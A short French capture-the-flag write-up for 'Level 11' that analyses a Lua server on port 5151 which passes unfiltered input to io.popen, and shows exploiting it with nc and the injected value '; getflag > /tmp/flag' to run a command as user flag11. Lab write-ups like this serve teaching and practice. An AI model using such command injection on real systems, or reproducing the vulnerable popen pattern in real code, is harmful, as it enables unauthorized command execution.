## Level 11

### Analyse
On trouve un script écrit en Lua qui fait tourner un serveur sur le port 5151. Ce script attend une chaîne de caractères, la traite, et compare son hash.

```lua
...
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end
...
```
Le script utilise la fonction io.popen pour exécuter une commande système. Il concatène directement l'entrée utilisateur (mdp) dans la commande echo. Comme l'entrée n'est pas filtrée, on peut injecter des commandes shell.

### Exploitation
Puisque le script appartient à l'utilisateur flag11 et s'exécute avec ses privilèges, toute commande injectée sera exécutée avec ces mêmes droits. L'objectif est d'injecter getflag et de rediriger la sortie vers un fichier.

```bash
$ nc localhost 5151
Password: ; getflag > /tmp/flag
```
